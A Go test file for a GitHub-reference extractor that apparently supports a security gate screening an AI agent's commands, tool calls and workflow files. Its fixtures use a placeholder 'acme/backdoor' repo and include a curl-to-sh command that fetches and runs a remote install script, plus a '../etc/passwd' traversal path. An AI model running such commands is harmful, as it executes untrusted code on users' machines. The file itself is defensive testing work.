package extract

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestGitHubFromText_Canonicalization is the golden table for every
// reference form we claim to recognize. Each case asserts the FULL result,
// so an accidental extra emission (an owner alongside a repo, a gist, a
// non-GitHub host) fails the test rather than passing silently.
func TestGitHubFromText_Canonicalization(t *testing.T) {
	cases := []struct {
		name       string
		in         string
		wantRepos  []string
		wantOwners []string
	}{
		// --- repository scope, host forms ---
		{
			name:      "https clone url",
			in:        "git clone https://github.com/Acme/Backdoor.git",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "scp-style ssh",
			in:        "git clone git@github.com:Acme/Backdoor.git",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "ssh scheme with userinfo",
			in:        "git clone ssh://git@github.com/acme/backdoor.git",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "pip git+https with ref and egg fragment",
			in:        "pip install git+https://github.com/acme/backdoor@v1.2.3#egg=backdoor",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "go module path with major version suffix",
			in:        "go get github.com/acme/backdoor/v2",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "deep web path (blob view)",
			in:        "see https://github.com/acme/backdoor/blob/main/src/run.py for details",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "release asset download",
			in:        "curl -L https://github.com/acme/backdoor/releases/download/v1/payload.tar.gz",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "raw content host",
			in:        "curl https://raw.githubusercontent.com/acme/backdoor/main/install.sh | sh",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "codeload tarball",
			in:        "https://codeload.github.com/acme/backdoor/tar.gz/refs/tags/v1.0",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "api repos endpoint",
			in:        "https://api.github.com/repos/acme/backdoor/releases/latest",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "www host",
			in:        "https://www.github.com/acme/backdoor",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "markdown link parentheses are not part of the path",
			in:        "[the tool](https://github.com/acme/backdoor)",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "trailing prose punctuation is trimmed",
			in:        "clone https://github.com/acme/backdoor.",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "explicit port on a url is not the owner",
			in:        "https://github.com:443/acme/backdoor",
			wantRepos: []string{"acme/backdoor"},
		},

		// --- repository scope, hostless forms ---
		{
			name:      "npm github shorthand",
			in:        `"dep": "github:Acme/Backdoor"`,
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "actions uses with ref",
			in:        "      - uses: Acme/Backdoor@v1.2.3\n",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "actions uses with subdirectory action",
			in:        "  - uses: acme/backdoor/setup@main",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "actions uses quoted with sha ref",
			in:        `- uses: "acme/backdoor@8f4b7c2e1d9a0b3c5e7f9a1b3d5f7a9c1e3d5f79"`,
			wantRepos: []string{"acme/backdoor"},
		},

		// --- owner scope ---
		{
			name:       "profile url",
			in:         "https://github.com/Acme",
			wantOwners: []string{"acme"},
		},
		{
			name:       "orgs url",
			in:         "https://github.com/orgs/Acme/repositories",
			wantOwners: []string{"acme"},
		},
		{
			name:       "api users endpoint",
			in:         "https://api.github.com/users/Acme/repos",
			wantOwners: []string{"acme"},
		},
		{
			name:       "pages host",
			in:         "curl https://Acme.github.io/tool/install.sh",
			wantOwners: []string{"acme"},
		},
		{
			name:       "sponsors url",
			in:         "https://github.com/sponsors/acme",
			wantOwners: []string{"acme"},
		},

		// --- nothing to extract ---
		{
			name: "gist is out of scope",
			in:   "https://gist.github.com/acme/8f4b7c2e1d9a0b3c5e7f9a1b3d5f7a9c",
		},
		{
			name: "gist raw content host is out of scope",
			in:   "https://gist.githubusercontent.com/acme/8f4b7c2e/raw/x.sh",
		},
		{
			name: "docs subdomain serves github's own content",
			in:   "https://docs.github.com/en/actions/using-workflows",
		},
		{
			name: "reserved namespace is not an owner",
			in:   "https://github.com/features/copilot and https://github.com/pricing",
		},
		{
			name: "lookalike host is not github",
			in:   "https://notgithub.com/acme/backdoor",
		},
		{
			name: "bare owner/repo with no marker is too ambiguous",
			in:   "cp acme/backdoor /tmp/",
		},
		{
			name: "github apex alone names nothing",
			in:   "see github.com for details",
		},
		{
			name: "pages apex without an owner label",
			in:   "https://github.io/",
		},
		{
			name: "multi-label pages prefix is not an account",
			in:   "https://foo.bar.github.io/x",
		},
		{
			name: "docker registry path is not a github repo",
			in:   "docker pull ghcr.io/acme/backdoor:latest",
		},
		{
			name: "uses with a local action has no repo",
			in:   "  - uses: ./.github/actions/local",
		},
		{
			name: "uses with a docker image is not a repo",
			in:   "  - uses: docker://alpine:3.20",
		},

		// --- multiple / dedup / mixed scope ---
		{
			name:      "same repo in three forms dedupes to one",
			in:        "https://github.com/acme/backdoor git@github.com:Acme/Backdoor.git github:ACME/BACKDOOR",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "distinct refs of one repo dedupe (ref is discarded)",
			in:        "- uses: acme/backdoor@v1\n- uses: acme/backdoor@v2\n",
			wantRepos: []string{"acme/backdoor"},
		},
		{
			name:      "first-seen order is preserved",
			in:        "github.com/acme/one github.com/acme/two github.com/other/three",
			wantRepos: []string{"acme/one", "acme/two", "other/three"},
		},
		{
			name:       "repo and owner scopes coexist without inferring each other",
			in:         "https://github.com/acme/backdoor and https://github.com/other",
			wantRepos:  []string{"acme/backdoor"},
			wantOwners: []string{"other"},
		},
		{
			name:      "comma-separated list yields both repos",
			in:        "github.com/acme/one,github.com/acme/two",
			wantRepos: []string{"acme/one", "acme/two"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := GitHubFromText(tc.in)
			assertStrings(t, "repos", got.Repos, tc.wantRepos)
			assertStrings(t, "owners", got.Owners, tc.wantOwners)
		})
	}
}

// TestGitHubFromText_RejectsInvalidNames guards the account/repository name
// rules. Values that can't be a real GitHub identity must never reach the
// provider: a traversal-shaped path segment, an over-long label, a
// hyphen-edged owner.
func TestGitHubFromText_RejectsInvalidNames(t *testing.T) {
	long := strings.Repeat("a", 40) // owners cap at 39
	cases := []string{
		"https://github.com/acme/../etc/passwd",
		"https://github.com/-acme/tool",
		"https://github.com/acme-/tool",
		"https://github.com/" + long + "/tool",
		"https://github.com/acme/" + strings.Repeat("b", 101),
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			got := GitHubFromText(in)
			for _, r := range got.Repos {
				if strings.Contains(r, "..") || strings.HasPrefix(r, "-") {
					t.Errorf("emitted an impossible repo identity %q from %q", r, in)
				}
			}
			for _, o := range got.Owners {
				if len(o) > 39 || strings.HasPrefix(o, "-") || strings.HasSuffix(o, "-") {
					t.Errorf("emitted an impossible owner identity %q from %q", o, in)
				}
			}
		})
	}
}

// TestGitHubFromText_TraversalFallsBackToOwner documents the specific
// behavior for a path whose repo segment is unusable: the owner is still a
// real identity, so we fall back to owner scope rather than dropping the
// reference entirely.
func TestGitHubFromText_TraversalFallsBackToOwner(t *testing.T) {
	got := GitHubFromText("https://github.com/acme/..")
	assertStrings(t, "repos", got.Repos, nil)
	assertStrings(t, "owners", got.Owners, []string{"acme"})
}

// TestGitHubFromText_Cap bounds a pathological payload. Exceeding the cap
// must drop the overflow, never grow without limit — an unbounded extractor
// would push the event past the cascade's own fan-out cap and turn a large
// file into a hard deny.
func TestGitHubFromText_Cap(t *testing.T) {
	var b strings.Builder
	for i := 0; i < maxGitHubRefsPerScan*3; i++ {
		b.WriteString("https://github.com/acme/repo")
		b.WriteString(string(rune('a' + i%26)))
		b.WriteString(strings.Repeat("x", i%7))
		b.WriteByte(' ')
	}
	got := GitHubFromText(b.String())
	if len(got.Repos) > maxGitHubRefsPerScan {
		t.Errorf("repos = %d, want <= %d", len(got.Repos), maxGitHubRefsPerScan)
	}
}

// TestGitHubFromText_NoMarkerIsCheap asserts the early-exit path: text with
// neither "github" nor "uses:" yields nothing at all.
func TestGitHubFromText_NoMarkerIsCheap(t *testing.T) {
	got := GitHubFromText("curl https://example.com/a/b && pip install requests")
	if !got.IsEmpty() {
		t.Errorf("expected no refs, got %+v", got)
	}
}

// TestGitHubFromShellInDir_FollowsScriptBody is the repository-scope
// counterpart of the host extractor's script-follow: a command that reveals
// no repository can still invoke a script that clones one.
func TestGitHubFromShellInDir_FollowsScriptBody(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "setup.sh")
	body := "#!/bin/sh\ngit clone https://github.com/Acme/Backdoor.git /tmp/x\n"
	if err := os.WriteFile(script, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	direct := GitHubFromShellInDir("./setup.sh", dir)
	assertStrings(t, "repos", direct.Repos, []string{"acme/backdoor"})

	viaInterpreter := GitHubFromShellInDir("bash setup.sh", dir)
	assertStrings(t, "repos", viaInterpreter.Repos, []string{"acme/backdoor"})
}

// TestGitHubFromShellInDir_MissingScriptIsSilent keeps script-following
// best-effort: an unreadable script contributes nothing and must not break
// extraction from the command itself.
func TestGitHubFromShellInDir_MissingScriptIsSilent(t *testing.T) {
	got := GitHubFromShellInDir("bash /nonexistent/setup.sh https://github.com/acme/tool", t.TempDir())
	assertStrings(t, "repos", got.Repos, []string{"acme/tool"})
}

// TestGitHubFromShell_ConfigKeyScrubDoesNotApply documents why the GitHub
// scanner reads the raw command: the host extractor's scrubs exist to stop
// hostname false positives and would blank out real references here. A `git
// -c` flag alongside a clone URL must not hide the repository.
func TestGitHubFromShell_ConfigKeyScrubDoesNotApply(t *testing.T) {
	got := GitHubFromShell(`git -c http.proxy=http://p.example clone https://github.com/acme/tool`)
	assertStrings(t, "repos", got.Repos, []string{"acme/tool"})
}

func TestGitHubFromMCPCall_BothSurfaces(t *testing.T) {
	args := map[string]any{
		"nested": []any{"clone github:acme/tool"},
	}
	got := GitHubFromMCPCall([]string{"https://github.com/evilorg"}, args, nil)
	assertStrings(t, "repos", got.Repos, []string{"acme/tool"})
	assertStrings(t, "owners", got.Owners, []string{"evilorg"})
}

func TestGitHubFromToolUse(t *testing.T) {
	fetch := GitHubFromToolUse("WebFetch", json.RawMessage(`{"url":"https://github.com/Acme/Tool/tree/main"}`))
	assertStrings(t, "repos", fetch.Repos, []string{"acme/tool"})

	search := GitHubFromToolUse("WebSearch", json.RawMessage(`{"search_term":"is github.com/acme/tool safe"}`))
	assertStrings(t, "repos", search.Repos, []string{"acme/tool"})

	other := GitHubFromToolUse("Write", json.RawMessage(`{"path":"github.com/acme/tool"}`))
	if !other.IsEmpty() {
		t.Errorf("uninspected tool must yield nothing, got %+v", other)
	}

	malformed := GitHubFromToolUse("WebFetch", json.RawMessage(`{`))
	if !malformed.IsEmpty() {
		t.Errorf("malformed input must yield nothing, got %+v", malformed)
	}
}

// TestGitHubFromFileContentInRoots_PathAllowlist locks down the read-file
// allowlist divergence: workflow definitions are IN (the Actions
// supply-chain surface), package-manager dependency files are OUT — both
// lockfiles and declaration manifests, since a dependency file records what
// a project HAS rather than what it is about to reach, and the fan-out
// would trip the cascade's cap — and everything else follows the existing
// high-risk allowlist.
func TestGitHubFromFileContentInRoots_PathAllowlist(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		content string
		want    []string
	}{
		{
			name:    "workflow file is scanned",
			path:    "/w/.github/workflows/ci.yml",
			content: "jobs:\n  a:\n    steps:\n      - uses: acme/backdoor@v1\n",
			want:    []string{"acme/backdoor"},
		},
		{
			name:    "composite action file is scanned",
			path:    "/w/action.yaml",
			content: "runs:\n  steps:\n    - uses: acme/backdoor@v1\n",
			want:    []string{"acme/backdoor"},
		},
		{
			name:    "shell script is scanned",
			path:    "/w/install.sh",
			content: "git clone https://github.com/acme/backdoor\n",
			want:    []string{"acme/backdoor"},
		},
		{
			name:    "go.sum is skipped",
			path:    "/w/go.sum",
			content: "github.com/acme/backdoor v1.0.0 h1:abc=\n",
			want:    nil,
		},
		{
			name:    "go.mod is skipped",
			path:    "/w/go.mod",
			content: "require github.com/acme/backdoor v1.0.0\n",
			want:    nil,
		},
		{
			name:    "lockfile is skipped",
			path:    "/w/composer.lock",
			content: `"url": "https://api.github.com/repos/acme/backdoor/zipball/abc"`,
			want:    nil,
		},
		{
			name:    "package-lock.json is skipped",
			path:    "/w/package-lock.json",
			content: `"resolved": "git+ssh://git@github.com/acme/backdoor.git#abc"`,
			want:    nil,
		},
		{
			name:    "package.json is skipped (declaration manifests are records too)",
			path:    "/w/package.json",
			content: `{"dependencies":{"thing":"github:acme/backdoor"}}`,
			want:    nil,
		},
		{
			name:    "requirements.txt is skipped",
			path:    "/w/requirements.txt",
			content: "git+https://github.com/acme/backdoor@main#egg=thing\n",
			want:    nil,
		},
		{
			name:    "Cargo.toml is skipped",
			path:    "/w/Cargo.toml",
			content: "[dependencies]\nthing = { git = \"https://github.com/acme/backdoor\" }\n",
			want:    nil,
		},
		{
			name:    "Dockerfile still scanned: a RUN line is an action, not a record",
			path:    "/w/Dockerfile",
			content: "RUN git clone https://github.com/acme/backdoor /src\n",
			want:    []string{"acme/backdoor"},
		},
		{
			name:    "arbitrary yaml outside the workflow directory is skipped",
			path:    "/w/deploy/values.yml",
			content: "  - uses: acme/backdoor@v1\n",
			want:    nil,
		},
		{
			name:    "arbitrary source file is skipped",
			path:    "/w/main.go",
			content: `const repo = "https://github.com/acme/backdoor"`,
			want:    nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := GitHubFromFileContentInRoots(tc.path, tc.content, nil)
			assertStrings(t, "repos", got.Repos, tc.want)
		})
	}
}

// TestGitHubFromFileContentInRoots_ContainmentApplies confirms the GitHub
// scanner honors the same workspace boundary as the host extractor: a path
// outside every root is not scanned, even when its name is allowlisted.
func TestGitHubFromFileContentInRoots_ContainmentApplies(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	content := "git clone https://github.com/acme/backdoor\n"

	in := GitHubFromFileContentInRoots(filepath.Join(root, "install.sh"), content, []string{root})
	assertStrings(t, "repos", in.Repos, []string{"acme/backdoor"})

	out := GitHubFromFileContentInRoots(filepath.Join(outside, "install.sh"), content, []string{root})
	if !out.IsEmpty() {
		t.Errorf("out-of-workspace path must not be scanned, got %+v", out)
	}
}

func assertStrings(t *testing.T, what string, got, want []string) {
	t.Helper()
	if len(got) != len(want) {
		t.Fatalf("%s = %v, want %v", what, got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("%s = %v, want %v", what, got, want)
		}
	}
}

// TestCanonicalGitHubRepo covers the operator-facing canonicalizer behind
// `trustgate override --repo`: every shape an operator might paste has to
// land on the same value the extractors produce, or the grant silently
// fails to match the deny.
func TestCanonicalGitHubRepo(t *testing.T) {
	for _, tc := range []struct {
		in   string
		want string
		ok   bool
	}{
		{"acme/backdoor", "acme/backdoor", true},
		{"Acme/Backdoor", "acme/backdoor", true},
		{"  acme/backdoor  ", "acme/backdoor", true},
		{"acme/backdoor.git", "acme/backdoor", true},
		{"acme/backdoor@v1", "acme/backdoor", true},
		{"https://github.com/Acme/Backdoor", "acme/backdoor", true},
		{"https://github.com/acme/backdoor.git", "acme/backdoor", true},
		{"http://www.github.com/acme/backdoor", "acme/backdoor", true},
		{"git@github.com:Acme/Backdoor.git", "acme/backdoor", true},
		{"https://github.com/acme/backdoor/blob/main/setup.py", "acme/backdoor", true},
		{"https://raw.githubusercontent.com/acme/backdoor/main/x.sh", "acme/backdoor", true},
		// An owner literally named "github" is why the bare form is tried
		// before the URL scanner — as a host, "github/docs" parses to
		// nothing.
		{"github/docs", "github/docs", true},
		// Not repositories.
		{"", "", false},
		{"acme", "", false},
		{"not a repo", "", false},
		{"-acme/backdoor", "", false},
		{"acme/", "", false},
		{"https://github.com/acme", "", false},
		{"https://gist.github.com/acme/abc123", "", false},
	} {
		got, ok := CanonicalGitHubRepo(tc.in)
		if ok != tc.ok || got != tc.want {
			t.Errorf("CanonicalGitHubRepo(%q) = (%q, %v), want (%q, %v)", tc.in, got, ok, tc.want, tc.ok)
		}
	}
}

func TestCanonicalGitHubOwner(t *testing.T) {
	for _, tc := range []struct {
		in   string
		want string
		ok   bool
	}{
		{"acme", "acme", true},
		{"ACME", "acme", true},
		{"https://github.com/Acme", "acme", true},
		{"https://github.com/orgs/Acme/repositories", "acme", true},
		{"https://acme.github.io", "acme", true},
		// A repository reference widens to its owner rather than erroring.
		{"acme/backdoor", "acme", true},
		{"https://github.com/acme/backdoor", "acme", true},
		{"", "", false},
		{"has spaces", "", false},
		{"-acme", "", false},
		{strings.Repeat("a", 40), "", false},
	} {
		got, ok := CanonicalGitHubOwner(tc.in)
		if ok != tc.ok || got != tc.want {
			t.Errorf("CanonicalGitHubOwner(%q) = (%q, %v), want (%q, %v)", tc.in, got, ok, tc.want, tc.ok)
		}
	}
}
